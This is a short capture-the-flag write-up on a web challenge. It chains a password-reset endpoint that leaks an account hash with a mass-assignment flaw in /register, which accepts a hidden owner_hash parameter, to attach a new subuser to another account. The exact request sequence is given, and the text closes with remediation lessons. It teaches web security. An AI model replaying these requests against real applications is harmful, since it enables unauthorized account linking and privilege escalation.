[VULNERABILITY DISCOVERY]
-------------------------
Mass Assignment on /register.

/dashboard/subusers uses owner_hash to link a subuser to a parent account.
/register accepts the same owner_hash parameter despite it not being in the public form.
Server does not validate owner_hash against the authenticated session.

hunter2's account_hash obtained via:
  POST /reset  username=hunter2
  -> account_hash=cf505baebbaf25a0a4c63eb93331eb36

[EXPLOITATION]
--------------
1. POST /reset  username=hunter2
   -> leaks account_hash=cf505baebbaf25a0a4c63eb93331eb36

2. POST /register
   new_username=test2&new_password=password&owner_hash=cf505baebbaf25a0a4c63eb93331eb36
   -> 302 redirect to /awaiting-enable

3. GET /awaiting-enable -> flag displayed

[LESSONS LEARNED]
-----------------
- Hidden form fields are client-controlled, never trust them server-side without session validation.
- Mass assignment: whitelist accepted parameters explicitly.
- Sensitive identifiers (account_hash) must not be exposed via unauthenticated endpoints.
